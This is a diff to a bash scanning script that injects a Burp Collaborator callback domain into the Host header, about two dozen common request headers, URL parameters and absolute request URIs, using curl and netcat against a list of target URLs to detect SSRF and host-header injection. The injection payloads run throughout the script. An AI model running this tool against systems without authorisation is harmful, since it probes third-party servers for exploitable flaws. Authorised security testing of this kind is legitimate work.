@@ -35,6 +35,7 @@ print_intro
 # Function to inject Host header
 inject_host_header() {
   echo -e "${light_blue}[*] Injecting Burp Collaborator into Host header...${NC}"
+  # For Counter
   counter=0
   total_urls=$(wc -l < "$list")
   while IFS= read -r domain; do
@@ -42,12 +43,13 @@ inject_host_header() {
     if [[ -z "$domain" ]]; then
       continue
     fi
+    UD=$(echo "$domain" | awk -F'[://" ]+' '{print $2}')
     current_time=$(date +"%H:%M:%S")
     # Increment the counter
     counter=$((counter + 1))
     # Send the HTTP GET request using curl (background) with additional headers
-    curl -H "Host: $Collab"  "$domain" &> /dev/null &
-    # Print the processed domain for reference (optional)
+    curl -H "Host: $UD.Host.$Collab"  "$domain" &> /dev/null &
+    # Print the processed domain for reference
     echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_host_header.log
     # Wait for $Delay seconds before next iteration
     sleep $delay
@@ -58,6 +60,7 @@ inject_host_header() {
 # Function to inject into common headers
 inject_common_headers() {
   echo -e "${light_blue}[*] Injecting Burp Collaborator into common headers...${NC}"
+  # For Counter
   counter=0
   total_urls=$(wc -l < "$list")  
   while IFS= read -r domain; do
@@ -66,15 +69,44 @@ inject_common_headers() {
       continue
     fi
     current_time=$(date +"%H:%M:%S")
+    UD=$(echo "$domain" | awk -F'[://" ]+' '{print $2}')
     # Increment the counter
     counter=$((counter + 1))
     # Send the HTTP GET request using curl (background) with additional headers
-    curl -H "From: root@$Collab" -H "User-Agent: Mozilla/5.0 root@$Collab" -H "Referer: http://$Collab/ref" -H "X-Original-URL: http://$Collab/" -H "X-Wap-Profile: http://$Collab/wap.xml" -H "Profile: http://$Collab/wap.xml" -H "X-Arbitrary: http://$Collab/" -H "X-HTTP-DestinationURL: http://$Collab/" -H "X-Forwarded-Proto: http://$Collab/" -H "Origin: http://$Collab/" -H "X-Forwarded-Host: $Collab" -H "X-Host: $Collab" -H "Proxy-Host: $Collab" -H "Destination: $Collab" -H "Proxy: http://$Collab/" -H "X-Forwarded-For: $Collab" -H "Contact: root@$Collab" -H "Forwarded: for=spoofed.$Collab;by=spoofed.$Collab;host=spoofed.$Collab" -H "X-Client-IP: $Collab" -H "Client-IP: $Collab" -H "True-Client-IP: $Collab" -H "CF-Connecting_IP: $Collab" -H "X-Originating-IP: $Collab" -H "X-Real-IP: $Collab" "$domain" &> /dev/null &    # Print the processed domain for reference (optional)
+    curl -H "From: root@$UD.From.$Collab" -H "User-Agent: Mozilla/5.0 root@$UD.User-Agent.$Collab" -H "Referer: http://$UD.Referer.$Collab/ref" -H "X-Original-URL: http://$UD.X-Original-URL.$Collab/" -H "X-Wap-Profile: http://$UD.X-Wap-Profile.$Collab/wap.xml" -H "Profile: http://$UD.Profile.$Collab/wap.xml" -H "X-Arbitrary: http://$UD.X-Arbitrary.$Collab/" -H "X-HTTP-DestinationURL: http://$UD.X-HTTP-DestinationURL.$Collab/" -H "X-Forwarded-Proto: http://$UD.X-Forwarded-Proto.$Collab/" -H "Origin: http://$UD.Origin.$Collab/" -H "X-Forwarded-Host: $UD.X-Forwarded-Host.$Collab" -H "X-Host: $UD.X-Host.$Collab" -H "Proxy-Host: $UD.Proxy-Host.$Collab" -H "Destination: $UD.Destination.$Collab" -H "Proxy: http://$UD.Proxy.$Collab/" -H "X-Forwarded-For: $UD.X-Forwarded-For.$Collab" -H "Contact: root@$UD.Contact.$Collab" -H "Forwarded: for=spoofed.$UD.Forwardedfor.$Collab;by=spoofed.$UD.Forwardedby.$Collab;host=spoofed.$UD.Forwardedhost.$Collab" -H "X-Client-IP: $UD.X-Client-IP.$Collab" -H "Client-IP: $UD.Client-IP.$Collab" -H "True-Client-IP: $UD.True-Client-IP.$Collab" -H "CF-Connecting_IP: $UD.CF-Connecting-IP.$Collab" -H "X-Originating-IP: $UD.X-Originating-IP.$Collab" -H "X-Real-IP: $UD.X-Real-IP.$Collab" "$domain" &> /dev/null &    
+    # Print the processed domain for reference
     echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_common_headers.log
     # Wait for $Delay seconds before next iteration
     sleep $delay
   done < "$list"
   echo -e "${GREEN}✅ Injecting Burp Collaborator into common headers ${YELLOW}Finished ${NC}"
+}
+
+# Function to inject into absolute URL
+inject_absolute_url() {
+  echo -e "${light_blue}[*] Injecting Burp Collaborator into absolute URL...${NC}"
+  # For Counter
+  counter=0
+  total_urls=$(wc -l < "$list")  
+  while IFS= read -r domain; do
+    # Check if the domain is empty
+    if [[ -z "$domain" ]]; then
+      continue
+    fi
+    current_time=$(date +"%H:%M:%S")
+    UD=$(echo "$domain" | awk -F'[://" ]+' '{print $2}')
+    # Increment the counter
+    counter=$((counter + 1))
+    # Send the row HTTP GET request using nc (background)
+    echo -e "GET http://$UD.$Collab/ HTTP/1.1\r\nHost: $UD\r\n" | nc -q 1 $UD 80  &> /dev/null &   
+    echo -e "GET http://$UD.$Collab/ HTTP/2\r\nHost: $UD\r\n" | nc -q 1 $UD 443 &> /dev/null &
+    echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_absolute_url.log
+    # Wait for $Delay seconds before next iteration
+    sleep $delay
+  done < "$list"
+  echo -e "${GREEN}✅ Injecting Burp Collaborator into absolute URL ${YELLOW}Finished ${NC}"
+
+
 }
 
 # Function to handle the "-e" option
@@ -108,7 +140,7 @@ inject_url_parameters() {
   fi
   # Extract parameters and inject separately
   IFS='&' read -r -a params <<< "$(echo "$url" | grep -oP '(?<=\?).*')"
-
+  UD=$(echo "$domain" | awk -F'[://" ]+' '{print $2}')
   # Base URL without parameters
   base_url=$(echo "$url" | grep -oP '^[^?]+')
   p=0
@@ -121,7 +153,7 @@ inject_url_parameters() {
     current_time=$(date +"%H:%M:%S")
     p=$((p + 1))
     # Construct new URL with the parameter injected
-    new_url="$base_url?$(echo "$url" | grep -oP '(?<=\?).*' | sed "s|$key=$value|$key=http://$Collab/?vulnerable_url=$base_url%26vulnerable_param=$key%26time=$current_time|")"
+    new_url="$base_url?$(echo "$url" | grep -oP '(?<=\?).*' | sed "s|$key=$value|$key=http://$UD.p.$Collab/?vulnerable_url=$base_url%26vulnerable_param=$key%26time=$current_time|")"
     # Send the request
     curl -L "$new_url" &> /dev/null &
     echo -e "${light_blue}[$counter/$total_urls](p$p) ${YELLOW}$current_time ${NC}- Sent request to: $new_url" | tee -a inject_url_parameters.log
@@ -132,11 +164,12 @@ inject_url_parameters() {
 }
 
 # Parse command-line options
-while getopts "heps:c:l:" opt; do
+while getopts "hepas:c:l:" opt; do
   case $opt in
     h) stages+=("host") ;;
     e) stages+=("headers") ;;
     p) stages+=("parameters") ;;
+    a) stages+=("absolute") ;;
     s) delay=$(echo "scale=2; 1/$OPTARG" | bc) ;;
     c) Collab="$OPTARG" ;;
     l) list="$OPTARG" ;;
@@ -156,5 +189,6 @@ for stage in "${stages[@]}"; do
     host) inject_host_header ;;
     headers) inject_common_headers "$Collab" ;;
     parameters) handle_e_option ;;
+    absolute) inject_absolute_url ;;
   esac
 done
